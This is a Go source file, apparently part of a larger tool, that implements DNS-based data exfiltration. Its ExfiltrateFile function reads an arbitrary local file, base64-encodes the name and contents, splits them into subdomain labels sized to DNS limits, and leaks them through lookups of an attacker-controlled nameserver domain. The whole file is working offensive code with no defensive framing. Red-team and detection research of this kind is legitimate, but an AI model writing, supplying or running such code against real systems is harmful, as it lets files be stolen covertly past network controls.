package exfiltrator

import (
	"context"
	"encoding/base64"
	"io/ioutil"
	"log"
	"net"
	"strings"
)

const (
	// To simplify implementations, the total length of a domain name (i.e.,
	// label octets and label length octets) is restricted to 255 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	MAX_DOMAIN_NAME_LENGTH = 255
	// Each node has a label, which is zero to 63 octets in length.
	// - https://www.rfc-editor.org/rfc/rfc1034#section-3.1
	MAX_SUBDOMAIN_NAME_LENGTH = 63
)

type dnsExfiltrator struct {
	nameServer string
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	absoluteNameServer := nameServer
	if nameServer[len(nameServer)-1] != '.' {
		absoluteNameServer += "."
	}
	return &dnsExfiltrator{
		nameServer: absoluteNameServer,
	}
}

func encodeToModifiedBase64(data []byte) string {
	base64Data := base64.URLEncoding.EncodeToString(data)
	// Cannot have '=' in domain names.
	return strings.Replace(base64Data, "=", "-", -1)
}

func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string) {
	// Domain names in messages are expressed in terms of a sequence of labels.
	// Each label is represented as a one octet length field followed by that
	// number of octets. Since every domain name ends with the null label of
	// the root, a domain name is terminated by a length byte of zero. The
	// high order two bits of every length octet must be zero, and the
	// remaining six bits of the length field limit the label to 63 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	//
	// This means that we need to take into account the length byte at the very
	// start as well as at the very end, hence subtract 2. We subtract another
	// 2 for the DNS message type.
	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.nameServer) - 2 - 2

	for len(encodedData) != 0 {
		bytesLeft := numOfBytesPerQuery
		dataToExfiltrate := msgType.String() + "."
		for bytesLeft > 0 {
			numBytesToAdd := bytesLeft
			if numBytesToAdd > MAX_SUBDOMAIN_NAME_LENGTH {
				numBytesToAdd = MAX_SUBDOMAIN_NAME_LENGTH
			}
			remainingBytes := len(encodedData)
			if numBytesToAdd > remainingBytes {
				numBytesToAdd = remainingBytes
			}

			dataToExfiltrate += encodedData[:numBytesToAdd] + "."
			encodedData = encodedData[numBytesToAdd:]
			if len(encodedData) == 0 {
				break
			}

			// Subtract 1 to account for the period that delimits subdomains.
			bytesLeft -= numBytesToAdd + 1
		}

		_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", dataToExfiltrate+ex.nameServer)
		if err != nil {
			log.Fatalln(err)
		}
	}
}

func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		log.Fatalln(err)
	}

	encodedFilename := encodeToModifiedBase64([]byte(filename))
	ex.exfiltrateData(DNS_FILE_START, encodedFilename)
	encodedData := encodeToModifiedBase64(data)
	ex.exfiltrateData(DNS_FILE_DATA, encodedData)
	ex.exfiltrateData(DNS_FILE_END, encodedFilename)
}
